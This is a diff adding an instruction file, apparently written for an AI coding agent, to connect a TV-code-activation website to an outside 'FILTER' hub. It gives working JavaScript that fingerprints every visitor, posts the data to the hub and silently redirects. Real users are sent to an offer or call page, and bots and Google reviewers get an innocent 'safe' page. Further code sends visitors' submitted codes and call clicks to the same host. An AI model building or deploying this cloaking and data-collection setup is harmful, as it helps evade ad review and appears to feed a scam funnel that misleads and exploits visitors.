@@ -1,0 +1,161 @@
+I need you to integrate my existing traffic management system (called FILTER) 
+into this website. FILTER is already running at https://activatemytvcode.com 
+and it handles all the cloaking, bot detection, and visitor tracking. 
+Your job is to wire this website up to it.
+
+Here is exactly what needs to happen:
+
+────────────────────────────────────────
+STEP 1 — ADD THE TRACKING SCRIPT TO EVERY PAGE
+────────────────────────────────────────
+
+Find every HTML file in this project (every .html file). In the <head> 
+section of each one, paste this script as the VERY FIRST thing 
+(before any other scripts or stylesheets):
+
+<script>
+(function(){
+  var _h='https://activatemytvcode.com',
+      _k='REPLACE_WITH_YOUR_API_KEY';
+  try{
+    fetch(_h+'/api/v1/pixel',{
+      method:'POST',
+      headers:{'Content-Type':'application/json','X-Client-ID':_k},
+      body:JSON.stringify({
+        ua:navigator.userAgent,
+        sw:screen.width,
+        sh:screen.height,
+        wd:!!navigator.webdriver,
+        pl:(navigator.plugins||[]).length,
+        tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+        pg:window.location.pathname
+      })
+    })
+    .then(function(r){return r.json()})
+    .then(function(d){if(d&&d.url)window.location.replace(d.url)})
+    .catch(function(){});
+  }catch(e){}
+})();
+</script>
+
+IMPORTANT: The _k value (REPLACE_WITH_YOUR_API_KEY) is unique — 
+I will give you the actual key below. Do not invent a key.
+
+My API key for this site is: [GO TO YOUR FILTER ADMIN → SITES → 
+YOUR SITE → SCRIPT TAB → COPY THE KEY SHOWN THERE]
+
+────────────────────────────────────────
+STEP 2 — HOW THE REDIRECT SYSTEM WORKS
+────────────────────────────────────────
+
+When the script runs, FILTER checks if the visitor is a real person 
+or a bot/reviewer. It then responds with one of two URLs:
+
+  - REAL VISITOR  → redirect to the OFFER URL (where you make money)
+  - BOT/REVIEWER  → redirect to the SAFE URL (a harmless landing page)
+
+You need two pages on this website:
+
+  A) OFFER PAGE — the page real visitors land on. 
+     This could be a phone number page, a form, or a redirect 
+     to an affiliate offer. 
+     URL path: /offer  (or whatever page you want real visitors to see)
+
+  B) SAFE PAGE — the page bots and Google reviewers see. 
+     This should look like a normal, innocent informational page 
+     with no phone numbers or offers. 
+     URL path: /safe  (or whatever page you want bots to see)
+
+These URLs are already configured in the FILTER admin panel under:
+  Sites → [your site] → General Tab → Offer URL and Safe URL
+
+If you need to change them, update them there, not here.
+
+────────────────────────────────────────
+STEP 3 — LEAD CAPTURE (ADD TO YOUR MAIN LANDING PAGE ONLY)
+────────────────────────────────────────
+
+On the main landing page where visitors enter their TV activation code 
+or click to call, add this lead tracking script in the <head>:
+
+<script>
+(function(){
+  var _h='https://activatemytvcode.com',
+      _k='REPLACE_WITH_YOUR_API_KEY';
+
+  // Call this when the visitor submits a code or form
+  window.trackLead = function(code, utmSource, utmCampaign, gclid) {
+    try {
+      fetch(_h+'/api/track/lead', {
+        method:'POST',
+        headers:{'Content-Type':'application/json','X-Site-Key':_k},
+        body: JSON.stringify({
+          type:'code_submit',
+          code: code || '',
+          utm_source: utmSource || new URLSearchParams(location.search).get('utm_source') || '',
+          utm_campaign: utmCampaign || new URLSearchParams(location.search).get('utm_campaign') || '',
+          utm_medium: new URLSearchParams(location.search).get('utm_medium') || '',
+          gclid: gclid || new URLSearchParams(location.search).get('gclid') || '',
+          tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          screen: screen.width+'x'+screen.height
+        })
+      }).catch(function(){});
+    } catch(e) {}
+  };
+
+  // Call this when the visitor clicks the phone number / call button
+  window.trackCall = function() {
+    try {
+      fetch(_h+'/api/track/lead', {
+        method:'POST',
+        headers:{'Content-Type':'application/json','X-Site-Key':_k},
+        body: JSON.stringify({type:'call_click'})
+      }).catch(function(){});
+    } catch(e) {}
+  };
+})();
+</script>
+
+Then wire up the buttons:
+  - When a form is submitted, call: window.trackLead(codeValue)
+  - When the phone/call button is clicked, call: window.trackCall()
+
+────────────────────────────────────────
+STEP 4 — WHAT NOT TO CHANGE
+────────────────────────────────────────
+
+Do NOT:
+  - Build your own admin panel or login system — one already exists 
+    at https://activatemytvcode.com/manage-zx7q2
+  - Create any new /api/ routes — all API endpoints are on the hub
+  - Add any database or session code — all data is stored on the hub
+  - Modify the _k (API key) value — it must match exactly what FILTER 
+    generated for this site
+
+────────────────────────────────────────
+STEP 5 — VERIFY THE INTEGRATION
+────────────────────────────────────────
+
+After adding the scripts, open this website in a browser. Then go to:
+  https://activatemytvcode.com/manage-zx7q2
+
+Log in and check the Click Log section. You should see your own visit 
+appear within a few seconds with your IP address and the page path 
+you visited. If it appears, the integration is working perfectly.
+
+If no entry appears after 30 seconds, check:
+  1. Is the script in the <head> before everything else?
+  2. Is the _k API key exactly correct (copy it again from the Script tab)?
+  3. Is the hub URL exactly: https://activatemytvcode.com (no trailing slash)?
+
+────────────────────────────────────────
+SUMMARY OF WHAT TO BUILD
+────────────────────────────────────────
+
+1. Add the pixel script to the <head> of EVERY .html file
+2. Make sure there is an /offer page (real visitor destination)
+3. Make sure there is a /safe page (bot/reviewer destination)
+4. Add the lead tracking script to the main landing page
+5. Wire trackLead() to form submissions and trackCall() to call button clicks
+6. Do not build anything else — all admin, logging, and analytics 
+   are already running on the hub
